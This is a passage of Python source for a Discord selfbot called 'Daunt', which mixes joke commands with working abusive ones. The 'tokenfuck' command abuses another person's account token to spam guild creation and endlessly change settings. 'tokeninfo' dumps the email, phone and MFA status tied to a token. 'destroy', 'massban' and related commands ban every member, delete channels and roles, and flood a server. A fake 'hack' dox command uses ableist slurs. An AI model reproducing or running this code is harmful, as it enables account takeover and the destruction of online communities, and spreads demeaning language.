            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@Daunt.command()
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


@Daunt.command(aliases=["reversesearch", "anticatfish", "catfish"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.MAGENTA}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Daunt.command(aliases=['av', 'pfp'])
async def avatar(ctx, *,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    embed=discord.Embed(title=f"", color=0x2f3136)
    embed.set_image(url=memb.avatar_url)
    embed.set_footer(text=f"{memb.name}")
    await ctx.message.edit(content="",embed=embed, delete_after=4)


@Daunt.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)


@Daunt.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    print(f'''
  [{Fore.MAGENTA}»{Fore.WHITE}] Sending a quick delete message in {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}, {Fore.MAGENTA}#{ctx.message.channel}{Fore.RESET}.''')
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)



@Daunt.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.MAGENTA}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Daunt.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Daunt",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.MAGENTA}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.MAGENTA}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@Daunt.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
async def fakenet(ctx, _type=None, *, name=None):
    await ctx.message.delete()
    if _type is None or name is None:
        await ctx.send("missing parameters")
        return
    ID = random.randrange(000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'lol']
    payload = {
        'name': name,
        'visibility': 1
    }
    token = config.get('token')
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
    }

    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
        return
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
                     data=json.dumps(payload), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
    else:
        await ctx.send(
            '**[ERROR]** `Daunt Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')


@Daunt.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    # em.set_footer(text=_token)
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@Daunt.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Daunt.create_guild(f'{ctx.guild.name}.')
    await asyncio.sleep(4)
    for g in Daunt.guilds:
        if f'{ctx.guild.name}.' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@Daunt.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
        "msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
        "1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
    await message.add_reaction('🅰')
    await message.add_reaction('🅱')


@Daunt.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        print(list(ctx.guild.members))
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)


@Daunt.command(aliases=["!nuke"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Initiating server nuke on {Fore.MAGENTA}{ctx.guild.name}{Fore.WHITE}...''')
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="daunt",
            reason="daunt",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="?")
    for _i in range(250):
        await ctx.guild.create_role(name="?", color=RandomColor())


@Daunt.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Initiating ban wave on {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}.''')
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Bye bye shitter")
        except:
            pass



@Daunt.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Initiating kick wave on {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}.''')
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Bye bye shitter")
        except:
            pass


@Daunt.command(aliases=["spamroles", "massroles", "addroles"])
async def massrole(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Initiating mass roles in {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}, {Fore.MAGENTA}#{ctx.message.channel}{Fore.RESET}.''')
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Daunt", color=RandomColor(), permissions=Permissions.all())
        except:
            try:
                await ctx.guild.create_role(name="Daunt", color=RandomColor())
            except:
                return


@Daunt.command(aliases=["givemeadmin", "giveadminrole", "giveadminroles"])
async def giveadmin(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            if role.permissions.administrator:
                await ctx.author.add_roles(role)
        except:
            pass


@Daunt.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Spamming channels in {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}.''')
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=".")
        except:
            return


@Daunt.command(aliases=["delchannel"])
async def delchannels(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Deleting all channels in {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}..''')
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@Daunt.command(aliases=["deleteroles"])
async def delroles(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Deleting all roles in {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}..''')
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass


@Daunt.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    print(f'''
  [{Fore.RED}MALICIOUS{Fore.WHITE}] Clearing ban list for {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}..''')
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Daunt.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@Daunt.command(aliases=['pong', 'latency'])
async def ping(ctx):
    f_img = config.get('f_img') # Footer (REQUIRED FOR FOOTER TEXT)
    await ctx.message.delete()

    embed=discord.Embed(description=f'```{round(Daunt.latency * 1000)}ms```', color=0x2f3136)
    embed.set_thumbnail(url="")
    embed.set_footer(text="Current User Ping", icon_url=f_img)
    await ctx.send(embed=embed, delete_after=5)

@Daunt.command()
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = Daunt.get_user(user.id)
    if ctx.author.id == Daunt.user.id:
        return
    else:
        try:
            await user.send(message)
        except:
            pass

@Daunt.command()
async def sex(ctx):
    await ctx.message.delete()
    print(f'''[{Fore.MAGENTA}»{Fore.WHITE}] Pinged for {Fore.MAGENTA}{Daunt.user.name}#{Daunt.user.discriminator}{Fore.WHITE}.''')
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")


@Daunt.command(aliases=["ginfo","infoserver"])
async def serverinfo(ctx):
    await ctx.message.delete()
    randcolor = random.randint(0xffc2f2, 0xffc2f2)
    embed=discord.Embed(title=f"Gathering info on {ctx.guild.name}", color=0x2f3136)
    message = await ctx.send(embed=embed)
    await asyncio.sleep(1)
    embed=discord.Embed(title=f"Gathering info on {ctx.guild.name}",color=0x2f3136)
    embed.set_footer(text="[]0% ")
    await message.edit(embed=embed)
    await asyncio.sleep(0.1)
    embed=discord.Embed(title=f"Gathering info on {ctx.guild.name}",color=0x2f3136)
    embed.set_footer(text="██]15% ")
    await message.edit(embed=embed)
    await asyncio.sleep(0.1)
    embed=discord.Embed(title=f"Gathering info on {ctx.guild.name}",color=0x2f3136)
    embed.set_footer(text="█████]45% ")
    await message.edit(embed=embed)
    await asyncio.sleep(0.1)
    embed=discord.Embed(title=f"Gathering info on {ctx.guild.name}",color=0x2f3136)
    embed.set_footer(text="█████████]73%")
    await message.edit(embed=embed)
    await asyncio.sleep(0.2)
    embed=discord.Embed(title=f"Gathering info on {ctx.guild.name}",color=0x2f3136)
    embed.set_footer(text="████████████]99%")
    await message.edit(embed=embed)
    await asyncio.sleep(1)
    try:
        boostlevel = ctx.guild.premium_tier
    except:
        boostlevel = "Error"
    try:
        boostcount = ctx.guild.premium_subscription_count
    except:
        boostcount = "Error"
    try:

        roles = len(ctx.guild.roles)
    except:
        roles = "Error"
    
    try:
        cate = len(ctx.guild.categories)
    except:
        cate = "Error"
    
    try:
        chanel = len(ctx.guild.channels)
    except:
        chanel = "Error"
    try:

        textchans = len(ctx.guild.text_channels)
    except:
        textchans = "Error"

    try:
        vcchans = len(ctx.guild.voice_channels)
    except:
        vcchans = "Error"
    try:

        users = ctx.guild.member_count
    except:
        users = "Error"

    try:
        onlineusers = sum(member.status==discord.Status.online and not member.bot for member in ctx.guild.members)
    except:
        onlineusers = "Error"
    try:
        offlineusers = sum(member.status==discord.Status.offline and not member.bot for member in ctx.guild.members)
    except:
        offlineusers = "Error"
    try:
   
        humans = sum(not member.bot for member in ctx.guild.members)
    except:
        humans = "Error"

    try:
  
        bots = sum(member.bot for member in ctx.guild.members)
    except:
        bots = "Error"
    
    info = f"""
**Server Boost Count:** ``{boostcount}``
**Server Boost Level:** ``{boostlevel}``

**Role Count** ``{roles}``
**Category Count** ``{cate}``
**Total Channel Count** ``{chanel}``

**Text Channel Count** ``{textchans}``
**Voice Channel Count** ``{vcchans}``

**Total Member Count** ``{users}``


"""

    randcolor = random.randint(0x2f3136, 0x2f3136)
    embed=discord.Embed(title=f"{ctx.guild.name}", description=info, color=randcolor)
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    embed.set_footer(text="»  daunt  » Server Info", icon_url="https://i.vgy.me/aA2N2j.png")
    await message.edit(embed=embed, delete_after=10)



@Daunt.command()
async def nagasaki(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print(f'''
  [{Fore.MAGENTA}»{Fore.WHITE}] The fake nuke for {Fore.MAGENTA}{ctx.guild.name}{Fore.WHITE} has started...''')
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing  {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
